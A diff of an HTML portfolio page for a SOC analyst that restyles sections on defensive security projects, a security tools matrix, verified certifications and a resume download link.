+                <p>Discovered 2 legacy database service accounts being used by administrators via RDP instead of named personal admin accounts. Remediated by enforcing AD GPO restricting service accounts from interactive logons.</p>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         12-14. SECURITY PROJECTS (Engineering Case Studies)
+         ========================================================================= -->
+    <section id="projects" class="content-section bg-surface-alt">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">ENGINEERING CASE STUDIES</span>
+          <h2 class="section-heading">Security Projects &amp; Lab Ranges</h2>
+          <p class="section-subtext">Defensive security projects structured around real enterprise operational problems, technical architecture, and validated metrics.</p>
+        </div>
+
+        <div class="projects-case-stack">
+
+          <!-- PROJECT 1 -->
+          <div class="project-case-card">
+            <div class="project-case-visual">
+              <img src="./assets/projects/siem_homelab.jpg" alt="Autonomous SOC Investigation System" loading="lazy">
+            </div>
+            <div class="project-case-content">
+              <div class="project-case-badge">DEFENSIVE AUTOMATION</div>
+              <h3>Autonomous SOC Investigation &amp; Threat Intelligence System</h3>
+              <div class="project-tech-line">Python • FAISS Vector Search • RAG • Sentinel &amp; Devo APIs</div>
+
+              <div class="project-kv-grid">
+                <div>
+                  <strong>Problem:</strong>
+                  <p>Analysts spend 15 to 20 minutes per alert manually querying threat intel portals and internal SIEM databases, delaying critical containment decisions.</p>
+                </div>
+                <div>
+                  <strong>Architecture:</strong>
+                  <p>Telemetry Ingest &rarr; Regex IOC Extractor &rarr; Parallel API Enrichment &rarr; Vector Search &rarr; ATT&amp;CK Mapping &rarr; Report.</p>
+                </div>
+                <div>
+                  <strong>Implementation:</strong>
+                  <p>Engineered an asynchronous Python pipeline integrating VirusTotal, AbuseIPDB, and AlienVault OTX APIs with a local FAISS vector DB for automated case matching.</p>
+                </div>
+                <div>
+                  <strong>Measurable Outcome:</strong>
+                  <p class="highlight-metric">Reduced manual IOC enrichment from <strong>~20 minutes</strong> to <strong>&lt;10 seconds</strong> per alert dossier with automated MITRE ATT&amp;CK classification.</p>
+                </div>
+              </div>
+
+              <div class="project-action-row">
+                <a href="https://www.kaggle.com/competitions/agents-intensive-capstone-project/writeups/intel-shield-ai" target="_blank" rel="noopener noreferrer" class="btn-repo-link">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="16 18 22 12 16 6"></polyline>
+                    <polyline points="8 6 2 12 8 18"></polyline>
+                  </svg>
+                  <span>View Kaggle Capstone Project ↗</span>
+                </a>
+                <a href="https://github.com/karrijayanth65/home-lab-soc" target="_blank" rel="noopener noreferrer" class="btn-secondary" style="padding: 8px 14px; font-size: 0.84rem;">
+                  <span>GitHub Repo ↗</span>
+                </a>
+              </div>
+            </div>
+          </div>
+
+          <!-- PROJECT 2 -->
+          <div class="project-case-card">
+            <div class="project-case-visual">
               <img src="./assets/projects/soc_investigations.jpg" alt="Enterprise Threat Detection & Simulation Lab" loading="lazy">
-              <a href="https://github.com/karrijayanth65/home-lab-soc" target="_blank" rel="noopener noreferrer" class="project-ref-code-btn" title="View Code" aria-label="View Code">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                  <polyline points="16 18 22 12 16 6"></polyline>
-                  <polyline points="8 6 2 12 8 18"></polyline>
-                </svg>
-              </a>
             </div>
+            <div class="project-case-content">
+              <div class="project-case-badge">DETECTION ENGINEERING LAB</div>
+              <h3>Enterprise Threat Detection &amp; Adversary Simulation Range</h3>
+              <div class="project-tech-line">Microsoft Sentinel • CrowdStrike EDR • Sysmon • Active Directory • KQL</div>
 
-            <div class="project-ref-body">
-              <h3 class="project-ref-title">Enterprise Threat Detection & Simulation Lab</h3>
-              <p class="project-ref-desc">
-                Virtual security operations range configured with endpoint telemetry sensors, Active Directory forest simulation, and centralized SIEM ingestion. Emulates real-world adversary behavior (credential dumping, lateral movement, persistence) to author, test, and tune high-fidelity KQL and Sigma rules.
-              </p>
-              <div class="project-ref-tag">
-                Microsoft Sentinel, CrowdStrike EDR, Sysmon & KQL Querying
+              <div class="project-kv-grid">
+                <div>
+                  <strong>Problem:</strong>
+                  <p>Validating custom detection rules against complex attacker behavior cannot be safely executed in live production environments.</p>
+                </div>
+                <div>
+                  <strong>Architecture:</strong>
+                  <p>Atomic Red Team &rarr; Telemetry Generation &rarr; Sentinel/Sysmon Ingestion &rarr; KQL Rule Authoring &rarr; Triage Playbook.</p>
+                </div>
+                <div>
+                  <strong>Implementation:</strong>
+                  <p>Configured an enterprise virtual range simulating Active Directory Domain Services, Windows Server SQL, and endpoints. Executed automated Atomic Red Team attack simulations.</p>
+                </div>
+                <div>
+                  <strong>Measurable Outcome:</strong>
+                  <p class="highlight-metric">Authored and validated <strong>15+ custom KQL detection rules</strong> with documented false-positive tuning playbooks and direct MITRE technique mappings.</p>
+                </div>
+              </div>
+
+              <div class="project-action-row">
+                <a href="https://github.com/karrijayanth65/home-lab-soc" target="_blank" rel="noopener noreferrer" class="btn-repo-link">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="16 18 22 12 16 6"></polyline>
+                    <polyline points="8 6 2 12 8 18"></polyline>
+                  </svg>
+                  <span>View Lab Documentation ↗</span>
+                </a>
               </div>
             </div>
           </div>
 
-          <!-- Real Project 3: Autonomous Threat Intel & IOC Enrichment Pipeline -->
-          <div class="project-ref-card">
-            <div class="project-ref-img-wrap">
+          <!-- PROJECT 3 -->
+          <div class="project-case-card">
+            <div class="project-case-visual">
               <img src="./assets/projects/osint_tool.svg" alt="Autonomous Threat Intel & IOC Enrichment Engine" loading="lazy">
-              <a href="https://github.com/karrijayanth65/home-lab-soc" target="_blank" rel="noopener noreferrer" class="project-ref-code-btn" title="View Code" aria-label="View Code">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                  <polyline points="16 18 22 12 16 6"></polyline>
-                  <polyline points="8 6 2 12 8 18"></polyline>
-                </svg>
-              </a>
             </div>
+            <div class="project-case-content">
+              <div class="project-case-badge">THREAT INTEL PIPELINE</div>
+              <h3>Autonomous Threat Intel &amp; Multi-Source IOC Enrichment Engine</h3>
+              <div class="project-tech-line">Python • VirusTotal API • AbuseIPDB • WHOIS • JSON Normalization</div>
 
-            <div class="project-ref-body">
-              <h3 class="project-ref-title">Autonomous Threat Intel & IOC Enrichment Pipeline</h3>
-              <p class="project-ref-desc">
-                Automated threat intelligence ingestion and enrichment engine integrating VirusTotal, AbuseIPDB, and IPGeolocation APIs to triage network artifacts, produce automated verdicts, and accelerate first-response investigations.
-              </p>
-              <div class="project-ref-tag">
-                Reduced IOC enrichment time from ~20 min to &lt;10 sec
+              <div class="project-kv-grid">
+                <div>
+                  <strong>Problem:</strong>
+                  <p>Raw security artifacts (IPs, domains, hashes) lack immediate reputation context, forcing repetitive manual lookups across browser tabs.</p>
+                </div>
+                <div>
+                  <strong>Architecture:</strong>
+                  <p>IOC Input &rarr; Parallel API Queries &rarr; Reputation &amp; ASN Scoring &rarr; Internal Log Correlation &rarr; Standardized JSON.</p>
+                </div>
+                <div>
+                  <strong>Implementation:</strong>
+                  <p>Engineered a modular Python tool querying reputation, ASN, geolocation, passive DNS, and sandbox detonation engines in parallel, normalizing findings for ticket ingestion.</p>
+                </div>
+                <div>
+                  <strong>Measurable Outcome:</strong>
+                  <p class="highlight-metric">Automated multi-source IOC enrichment producing actionable risk verdicts in <strong>&lt;5 seconds</strong>, accelerating triage across high-volume email alerts.</p>
+                </div>
+              </div>
+
+              <div class="project-action-row">
+                <a href="https://www.kaggle.com/code/rceeec18jayanthkarri/autonomous-threat-intel-multi-source-ioc-enrichm" target="_blank" rel="noopener noreferrer" class="btn-repo-link">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <polyline points="16 18 22 12 16 6"></polyline>
+                    <polyline points="8 6 2 12 8 18"></polyline>
+                  </svg>
+                  <span>View Pipeline Code ↗</span>
+                </a>
               </div>
             </div>
           </div>
+
+          <!-- PROJECT 4: MEDIUM WRITE-UPS -->
+          <div class="project-case-card">
+            <div class="project-case-visual">
+              <img src="./assets/projects/medium_writeup.jpg" alt="Medium Security Analysis & Incident Investigation Write-ups" loading="lazy">
+            </div>
+            <div class="project-case-content">
+              <div class="project-case-badge">TECHNICAL PUBLICATION • MEDIUM</div>
+              <h3>Security Operations, Malware Triage &amp; Detection Write-ups</h3>
+              <div class="project-tech-line">Medium • Threat Hunting • SIEM Telemetry • Incident Response • KQL Analysis</div>
+
+              <div class="project-kv-grid">
+                <div>
+                  <strong>Overview:</strong>
+                  <p>In-depth technical publications breaking down defensive security analysis, live malware alert triaging, and real-world Blue Team methodology.</p>
+                </div>
+                <div>
+                  <strong>Platform:</strong>
+                  <p>Published on Medium under <code>@nameisnani2027</code>, authoring accessible yet deeply technical incident response investigations for defensive practitioners.</p>
+                </div>
+                <div>
+                  <strong>Core Coverage:</strong>
+                  <p>Suspicious LOLBins, PowerShell script deobfuscation, Multi-Factor Authentication bypass mechanics, and automated incident containment playbooks.</p>
+                </div>
+                <div>
+                  <strong>Measurable Outcome:</strong>
+                  <p class="highlight-metric">Practical investigative guides providing step-by-step telemetry queries and forensic evidence reconstruction.</p>
+                </div>
+              </div>
+
+              <div class="project-action-row">
+                <a href="https://medium.com/@nameisnani2027" target="_blank" rel="noopener noreferrer" class="btn-repo-link">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M13.54 12a6.8 6.8 0 01-6.77 6.82A6.8 6.8 0 010 12a6.8 6.8 0 016.77-6.82A6.8 6.8 0 0113.54 12zM20.96 12c0 3.54-1.51 6.42-3.38 6.42-1.87 0-3.39-2.88-3.39-6.42s1.52-6.42 3.39-6.42 3.38 2.88 3.38 6.42M24 12c0 3.17-.53 5.75-1.19 5.75-.66 0-1.19-2.58-1.19-5.75s.53-5.75 1.19-5.75C23.47 6.25 24 8.83 24 12z"/>
+                  </svg>
+                  <span>Read Write-ups on Medium ↗</span>
+                </a>
+              </div>
+            </div>
+          </div>
+
         </div>
       </div>
     </section>
 
     <!-- =========================================================================
-         CERTIFICATIONS SECTION (IMAGE 1 FORMAT, JAYANTH'S REAL VERIFIED CERTS)
-         Card grid with image, circular preview eye button, and bold title below.
+         15 & 17. TOOLS & SECURITY MATRIX
          ========================================================================= -->
-    <section id="certifications" class="content-section">
+    <section id="matrix" class="content-section">
       <div class="section-container">
-        <div class="section-header-ref">
-          <h2 class="section-title-ref">My Certifications</h2>
-          <div class="section-title-line"></div>
+        <div class="section-header">
+          <span class="section-eyebrow">TECHNOLOGY &amp; METHODOLOGY</span>
+          <h2 class="section-heading">Tools &amp; Security Matrix</h2>
+          <p class="section-subtext">Enterprise security tooling grouped by operational SOC workflows, supported by a practical hands-on capability matrix.</p>
         </div>
 
-        <div class="certs-ref-grid">
-          <!-- Real Cert 1: Microsoft Certified SC-200 -->
-          <div class="cert-ref-card">
-            <div class="cert-ref-img-wrap" onclick="openModal('image', './assets/certs/SC%20200.jpg', 'Microsoft Certified: SC-200 Security Operations Analyst')">
+        <!-- Workflow Groupings -->
+        <div class="workflow-tools-grid">
+          <div class="workflow-card">
+            <h4><span class="wf-icon">📊</span> SIEM Platforms</h4>
+            <div class="wf-chips">
+              <span class="wf-chip">Devo SIEM</span>
+              <span class="wf-chip">Microsoft Sentinel</span>
+              <span class="wf-chip">Wazuh</span>
+              <span class="wf-chip">Splunk</span>
+            </div>
+            <p>High-volume log ingestion, multi-table correlation, scheduled alert rule authoring, and incident triage.</p>
+          </div>
+
+          <div class="workflow-card">
+            <h4><span class="wf-icon">💻</span> EDR &amp; XDR</h4>
+            <div class="wf-chips">
+              <span class="wf-chip">CrowdStrike Falcon</span>
+              <span class="wf-chip">Microsoft Defender XDR</span>
+            </div>
+            <p>Real-time endpoint process ancestry triage, behavioral telemetry, host network isolation, and memory dump capture.</p>
+          </div>
+
+          <div class="workflow-card">
+            <h4><span class="wf-icon">🔑</span> Identity &amp; Cloud</h4>
+            <div class="wf-chips">
+              <span class="wf-chip">Microsoft Entra ID</span>
+              <span class="wf-chip">Azure AD</span>
+              <span class="wf-chip">Conditional Access</span>
+            </div>
+            <p>Authentication log analysis, password spray triage, impossible travel detection, and session token revocation.</p>
+          </div>
+
+          <div class="workflow-card">
+            <h4><span class="wf-icon">📧</span> Email &amp; Network</h4>
+            <div class="wf-chips">
+              <span class="wf-chip">Avanan Phishing Defense</span>
+              <span class="wf-chip">Check Point Harmony</span>
+              <span class="wf-chip">Netskope CASB</span>
+            </div>
+            <p>Phishing header analysis, URL detonator triage, enterprise-wide mailbox quarantine, and proxy web inspection.</p>
+          </div>
+
+          <div class="workflow-card">
+            <h4><span class="wf-icon">⚡</span> Query &amp; Investigation</h4>
+            <div class="wf-chips">
+              <span class="wf-chip">KQL (Kusto Query)</span>
+              <span class="wf-chip">Devo LINQ</span>
+              <span class="wf-chip">Splunk SPL</span>
+            </div>
+            <p>Authoring high-fidelity detection rules, multi-entity join queries, time-series aggregations, and hunting queries.</p>
+          </div>
+
+          <div class="workflow-card">
+            <h4><span class="wf-icon">🌐</span> Threat Intelligence &amp; ITSM</h4>
+            <div class="wf-chips">
+              <span class="wf-chip">VirusTotal</span>
+              <span class="wf-chip">AbuseIPDB</span>
+              <span class="wf-chip">MITRE ATT&amp;CK</span>
+              <span class="wf-chip">ServiceNow</span>
+            </div>
+            <p>Reputation enrichment, adversary TTP mapping, SLA ticket lifecycle management, and MTTR compliance.</p>
+          </div>
+        </div>
+
+        <!-- Security Tool Matrix Table -->
+        <div class="matrix-table-wrapper mt-5">
+          <h3 class="matrix-heading">Enterprise Security Tool Matrix</h3>
+          <div class="table-scroll-container">
+            <table class="clean-evidence-table">
+              <thead>
+                <tr>
+                  <th>Operational Area</th>
+                  <th>Enterprise Technologies</th>
+                  <th>Practical Enterprise SOC Usage</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><strong>SIEM</strong></td>
+                  <td>Devo, Microsoft Sentinel, Wazuh, Splunk</td>
+                  <td>Continuous 24/7 alert triage, multi-source log correlation, KQL detection authoring, and SLA escalation.</td>
+                </tr>
+                <tr>
+                  <td><strong>EDR / XDR</strong></td>
+                  <td>CrowdStrike Falcon, Microsoft Defender XDR</td>
+                  <td>Endpoint forensic investigation, parent-child process tree analysis, hash lookup, and host network isolation.</td>
+                </tr>
+                <tr>
+                  <td><strong>Identity</strong></td>
+                  <td>Microsoft Entra ID (Azure AD)</td>
+                  <td>Authentication analysis, failed-login pattern recognition, impossible travel triage, and session token revocation.</td>
+                </tr>
+                <tr>
+                  <td><strong>Email Security</strong></td>
+                  <td>Avanan, Check Point Harmony</td>
+                  <td>Phishing campaign triage, malicious attachment analysis, credential harvester blocking, and tenant mailbox sweep.</td>
+                </tr>
+                <tr>
+                  <td><strong>Network Security</strong></td>
+                  <td>Check Point Firewall, Netskope CASB</td>
+                  <td>Egress traffic analysis, C2 beaconing detection, DNS query inspection, and malicious IP/domain perimeter blocking.</td>
+                </tr>
+                <tr>
+                  <td><strong>Query &amp; Search</strong></td>
+                  <td>KQL, Devo LINQ, SPL</td>
+                  <td>Authoring behavior-based detection rules, hypothesis-driven threat hunting, and multi-table log correlation.</td>
+                </tr>
+                <tr>
+                  <td><strong>Frameworks</strong></td>
+                  <td>MITRE ATT&amp;CK, Cyber Kill Chain</td>
+                  <td>Classifying adversary TTPs, mapping detection coverage gaps, and standardizing incident remediation playbooks.</td>
+                </tr>
+                <tr>
+                  <td><strong>Automation</strong></td>
+                  <td>Python, REST APIs</td>
+                  <td>Automating multi-source IOC enrichment, parsing raw security telemetry, and accelerating investigation triage.</td>
+                </tr>
+                <tr>
+                  <td><strong>ITSM &amp; Ticketing</strong></td>
+                  <td>ServiceNow</td>
+                  <td>End-to-end incident management, strict SLA adherence, technical escalation dossiers, and post-incident documentation.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- =========================================================================
+         16. CERTIFICATIONS (Verified Credentials)
+         ========================================================================= -->
+    <section id="certifications" class="content-section bg-surface-alt">
+      <div class="section-container">
+        <div class="section-header">
+          <span class="section-eyebrow">CREDENTIALS</span>
+          <h2 class="section-heading">Verified Certifications</h2>
+          <p class="section-subtext">Industry-recognized credentials supporting practical, hands-on operational capability in security operations, threat detection, and incident response.</p>
+        </div>
+
+        <div class="certifications-grid">
+          <!-- Cert 1: SC-200 -->
+          <div class="cert-item-card">
+            <div class="cert-thumb-wrap" onclick="openModal('image', './assets/certs/SC%20200.jpg', 'Microsoft Certified: Security Operations Analyst (SC-200)')">
               <img src="./assets/certs/SC%20200.jpg" alt="Microsoft Certified: Security Operations Analyst (SC-200)" loading="lazy">
-              <button class="cert-ref-action-btn" onclick="event.stopPropagation(); openModal('image', './assets/certs/SC%20200.jpg', 'Microsoft Certified: SC-200 Security Operations Analyst')" aria-label="Preview Certificate" title="Preview Certificate">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <button class="cert-hover-btn" onclick="event.stopPropagation(); openModal('image', './assets/certs/SC%20200.jpg', 'Microsoft Certified: Security Operations Analyst (SC-200)')" aria-label="Preview Certificate" title="Preview Certificate">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                   <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                   <circle cx="12" cy="12" r="3"></circle>
                 </svg>
               </button>
             </div>
-            <div class="cert-ref-body">
-              <h3 class="cert-ref-title">Microsoft Certified: Security Operations Analyst (SC-200)</h3>
-              <p class="cert-ref-issuer">Microsoft • ID: 7509C0DA393C795E • Verified Associate</p>
-              <a href="https://learn.microsoft.com/en-us/users/jayanthkarri-4682/credentials/7509c0da393c795e?ref=https%3A%2F%2Fwww.linkedin.com%2F" target="_blank" rel="noopener noreferrer" class="cert-verify-link">
+            <div class="cert-card-body">
+              <h4>Microsoft Certified: Security Operations Analyst (SC-200)</h4>
+              <p class="cert-issuer-line">Microsoft • ID: 7509C0DA393C795E • Verified Associate</p>
+              <div class="cert-tags-line">Sentinel • Defender XDR • KQL • Entra ID • Incident Response</div>
+              <a href="https://learn.microsoft.com/en-us/users/jayanthkarri-4682/credentials/7509c0da393c795e" target="_blank" rel="noopener noreferrer" class="cert-verify-action">
                 Verify Credential ↗
               </a>
             </div>
           </div>
 
-          <!-- Real Cert 2: CompTIA Security+ (SY0-701) -->
-          <div class="cert-ref-card">
-            <div class="cert-ref-img-wrap" onclick="openModal('image', './assets/certs/CompTIA%20Security+.jpg', 'CompTIA Security+ (SY0-701)')">
+          <!-- Cert 2: CompTIA Security+ -->
+          <div class="cert-item-card">
+            <div class="cert-thumb-wrap" onclick="openModal('image', './assets/certs/CompTIA%20Security+.jpg', 'CompTIA Security+ (SY0-701)')">
               <img src="./assets/certs/CompTIA%20Security+.jpg" alt="CompTIA Security+ (SY0-701)" loading="lazy">
-              <button class="cert-ref-action-btn" onclick="event.stopPropagation(); openModal('image', './assets/certs/CompTIA%20Security+.jpg', 'CompTIA Security+ (SY0-701)')" aria-label="Preview Certificate" title="Preview Certificate">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <button class="cert-hover-btn" onclick="event.stopPropagation(); openModal('image', './assets/certs/CompTIA%20Security+.jpg', 'CompTIA Security+ (SY0-701)')" aria-label="Preview Certificate" title="Preview Certificate">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                   <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                   <circle cx="12" cy="12" r="3"></circle>
                 </svg>
               </button>
             </div>
-            <div class="cert-ref-body">
-              <h3 class="cert-ref-title">CompTIA Security+ (SY0-701)</h3>
-              <p class="cert-ref-issuer">Computing Technology Industry Association • Credly Verified</p>
-              <a href="https://www.credly.com/badges/1c25b324-0c4f-41bd-843f-246f5774db5c" target="_blank" rel="noopener noreferrer" class="cert-verify-link">
+            <div class="cert-card-body">
+              <h4>CompTIA Security+ (SY0-701)</h4>
+              <p class="cert-issuer-line">Computing Technology Industry Association • Credly Verified</p>
+              <div class="cert-tags-line">Threats &amp; Vulnerabilities • Architecture • Operations • Response</div>
+              <a href="https://www.credly.com/badges/1c25b324-0c4f-41bd-843f-246f5774db5c" target="_blank" rel="noopener noreferrer" class="cert-verify-action">
                 Verify on Credly ↗
               </a>
             </div>
           </div>
 
-          <!-- Real Cert 3: Google Cybersecurity Professional Certificate -->
-          <div class="cert-ref-card">
-            <div class="cert-ref-img-wrap" onclick="openModal('image', './assets/certs/Google%20Cybersecurity.jpg', 'Google Cybersecurity Professional Certificate')">
+          <!-- Cert 3: Google Cybersecurity -->
+          <div class="cert-item-card">
+            <div class="cert-thumb-wrap" onclick="openModal('image', './assets/certs/Google%20Cybersecurity.jpg', 'Google Cybersecurity Professional Certificate')">
               <img src="./assets/certs/Google%20Cybersecurity.jpg" alt="Google Cybersecurity Professional Certificate" loading="lazy">
-              <button class="cert-ref-action-btn" onclick="event.stopPropagation(); openModal('image', './assets/certs/Google%20Cybersecurity.jpg', 'Google Cybersecurity Professional Certificate')" aria-label="Preview Certificate" title="Preview Certificate">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <button class="cert-hover-btn" onclick="event.stopPropagation(); openModal('image', './assets/certs/Google%20Cybersecurity.jpg', 'Google Cybersecurity Professional Certificate')" aria-label="Preview Certificate" title="Preview Certificate">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                   <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                   <circle cx="12" cy="12" r="3"></circle>
                 </svg>
               </button>
             </div>
-            <div class="cert-ref-body">
-              <h3 class="cert-ref-title">Google Cybersecurity Professional Certificate</h3>
-              <p class="cert-ref-issuer">Google Career Certificates • Coursera Verified</p>
-              <a href="https://www.coursera.org/account/accomplishments/professional-cert/certificate/QUANVRM0SN0Y" target="_blank" rel="noopener noreferrer" class="cert-verify-link">
+            <div class="cert-card-body">
+              <h4>Google Cybersecurity Professional Certificate</h4>
+              <p class="cert-issuer-line">Google Career Certificates • Coursera Verified</p>
+              <div class="cert-tags-line">SIEM • Python Automation • Linux CLI • SQL • Incident Triage</div>
+              <a href="https://www.coursera.org/account/accomplishments/professional-cert/certificate/QUANVRM0SN0Y" target="_blank" rel="noopener noreferrer" class="cert-verify-action">
                 Verify on Coursera ↗
               </a>
             </div>
           </div>
 
-          <!-- Real Cert 4: LetsDefend Certified SOC Analyst -->
-          <div class="cert-ref-card">
-            <div class="cert-ref-img-wrap" onclick="openModal('image', './assets/certs/Lets%20defend%20Soc%20Analyst.png', 'LetsDefend Certified SOC Analyst')">
+          <!-- Cert 4: LetsDefend SOC Analyst -->
+          <div class="cert-item-card">
+            <div class="cert-thumb-wrap" onclick="openModal('image', './assets/certs/Lets%20defend%20Soc%20Analyst.png', 'LetsDefend Certified SOC Analyst')">
               <img src="./assets/certs/Lets%20defend%20Soc%20Analyst.png" alt="LetsDefend Certified SOC Analyst" loading="lazy">
-              <button class="cert-ref-action-btn" onclick="event.stopPropagation(); openModal('image', './assets/certs/Lets%20defend%20Soc%20Analyst.png', 'LetsDefend Certified SOC Analyst')" aria-label="Preview Certificate" title="Preview Certificate">
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <button class="cert-hover-btn" onclick="event.stopPropagation(); openModal('image', './assets/certs/Lets%20defend%20Soc%20Analyst.png', 'LetsDefend Certified SOC Analyst')" aria-label="Preview Certificate" title="Preview Certificate">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                   <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                   <circle cx="12" cy="12" r="3"></circle>
                 </svg>
               </button>
             </div>
-            <div class="cert-ref-body">
-              <h3 class="cert-ref-title">LetsDefend Certified SOC Analyst</h3>
-              <p class="cert-ref-issuer">LetsDefend Academy • Hands-On Incident Triage Verified</p>
-              <a href="https://app.letsdefend.io/certificate/show/29b276fb-9e4e-4e3c-b181-3319d1684fd4" target="_blank" rel="noopener noreferrer" class="cert-verify-link">
+            <div class="cert-card-body">
+              <h4>LetsDefend Certified SOC Analyst</h4>
+              <p class="cert-issuer-line">LetsDefend Academy • Practical Incident Triage Verified</p>
+              <div class="cert-tags-line">Hands-on Triage • Phishing Analysis • Malware Triage • EDR Playbooks</div>
+              <a href="https://app.letsdefend.io/certificate/show/29b276fb-9e4e-4e3c-b181-3319d1684fd4" target="_blank" rel="noopener noreferrer" class="cert-verify-action">
                 Verify Badge ↗
               </a>
             </div>
@@ -440,170 +2220,155 @@
     </section>
 
     <!-- =========================================================================
-         ABOUT ME SECTION (IMAGE 5 FORMAT, JAYANTH'S REAL INFO)
-         Bio paragraph, Achievements 4 cards, [ Technical Skills | Education ] tabs,
-         and skill chips.
+         18. RESUME SECTION (One Click Away)
          ========================================================================= -->
-    <section id="about" class="content-section">
+    <section id="resume" class="content-section">
       <div class="section-container">
-        <div class="section-header-ref">
-          <h2 class="section-title-ref">About Me</h2>
-          <div class="section-title-line"></div>
-        </div>
-
-        <p class="about-bio-text">
-          SOC Analyst specializing in real-time threat detection, incident response, endpoint investigation, and cloud security. Experienced in handling phishing, malware, and emerging threats using enterprise SIEM, EDR, and cloud security platforms. Passionate about detection engineering and security automation.
-        </p>
-
-        <h3 class="about-subheading">Achievements</h3>
-
-        <!-- 4 Horizontal Stat Cards (Image 5 format, Real Data) -->
-        <div class="achievements-grid">
-          <div class="achievement-card">
-            <span class="achievement-icon">🛡️</span>
-            <span class="achievement-val">Mphasis SOC Analyst</span>
-            <span class="achievement-sub">24/7 Threat Monitoring</span>
-          </div>
-
-          <div class="achievement-card">
-            <span class="achievement-icon">⚡</span>
-            <span class="achievement-val">Strict SLA Adherence</span>
-            <span class="achievement-sub">High-Severity Alert Triage</span>
-          </div>
-
-          <div class="achievement-card">
-            <span class="achievement-icon">🎓</span>
-            <span class="achievement-val">B.Tech in ECE</span>
-            <span class="achievement-sub">Engineering Foundation</span>
-          </div>
-
-          <div class="achievement-card">
-            <span class="achievement-icon">🔒</span>
-            <span class="achievement-val">CompTIA &amp; SC-200</span>
-            <span class="achievement-sub">Verified Blue Team Certs</span>
+        <div class="resume-cta-box">
+          <span class="section-eyebrow">DOCUMENTATION</span>
+          <h2 class="resume-cta-heading">Want the full professional profile?</h2>
+          <p class="resume-cta-sub">My resume provides a complete overview of my professional SOC experience at Mphasis, technical investigation competencies, certifications, and security projects.</p>
+          
+          <div class="resume-cta-actions">
+            <a href="./assets/resume/Jayanth_Soc-Analyst.pdf" target="_blank" rel="noopener noreferrer" class="btn-primary">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                <polyline points="7 10 12 15 17 10"></polyline>
+                <line x1="12" y1="15" x2="12" y2="3"></line>
+              </svg>
+              <span>Download Resume (PDF)</span>
+            </a>
+            <a href="https://www.linkedin.com/in/karri-jayanth/" target="_blank" rel="noopener noreferrer" class="btn-secondary">
+              <span>View LinkedIn Profile ↗</span>
+            </a>
+            <a href="https://github.com/karrijayanth65" target="_blank" rel="noopener noreferrer" class="btn-secondary">
+              <span>View GitHub Repositories ↗</span>
+            </a>
+            <a href="https://medium.com/@nameisnani2027" target="_blank" rel="noopener noreferrer" class="btn-secondary">
+              <span>Read Medium Write-ups ↗</span>
+            </a>
           </div>
         </div>
-
-        <!-- Interactive Tabs: Technical Skills | Education -->
-        <div class="about-tabs-row">
-          <button id="tabAboutSkills" class="about-tab-btn active" onclick="switchAboutTab('skills')">
-            Technical Skills
-          </button>
-          <button id="tabAboutEdu" class="about-tab-btn" onclick="switchAboutTab('education')">
-            Education &amp; Credentials
-          </button>
-        </div>
-
-        <!-- Panel 1: Technical Skills -->
-        <div id="panelAboutSkills" class="about-panel active">
-          <h3 class="about-subheading">Core Capabilities</h3>
-          <div class="skill-pills-ref">
-            <span class="skill-pill-item">Security Operations Center (SOC)</span>
-            <span class="skill-pill-item">Alert Triage &amp; Escalation</span>
-            <span class="skill-pill-item">Incident Response &amp; Containment</span>
-            <span class="skill-pill-item">Threat Hunting &amp; Detection</span>
-            <span class="skill-pill-item">Devo SIEM</span>
-            <span class="skill-pill-item">Microsoft Sentinel</span>
-            <span class="skill-pill-item">Defender XDR</span>
-            <span class="skill-pill-item">CrowdStrike Falcon EDR</span>
-            <span class="skill-pill-item">Avanan Phishing Defense</span>
-            <span class="skill-pill-item">Check Point Harmony</span>
-            <span class="skill-pill-item">Netskope CASB</span>
-            <span class="skill-pill-item">Microsoft Entra ID (Azure AD)</span>
-            <span class="skill-pill-item">KQL Querying</span>
-            <span class="skill-pill-item">MITRE ATT&amp;CK Framework</span>
-            <span class="skill-pill-item">ServiceNow SLA Management</span>
-            <span class="skill-pill-item">Sysmon Telemetry</span>
-            <span class="skill-pill-item">Python</span>
-            <span class="skill-pill-item">RAG &amp; Vector Search (FAISS)</span>
